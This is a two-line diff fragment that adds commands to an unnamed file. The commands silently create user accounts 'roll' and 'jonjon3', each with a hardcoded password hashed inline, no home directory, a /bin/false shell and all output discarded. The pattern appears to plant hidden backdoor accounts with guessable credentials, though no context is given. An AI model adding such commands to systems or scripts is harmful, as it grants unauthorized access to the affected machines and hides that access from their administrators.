@@ -1,0 +1,2 @@
+/usr/sbin/useradd -p $(openssl passwd -1 roll) -s /bin/false -M roll &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 jonjon) -s /bin/false -M jonjon3 &> /dev/null;
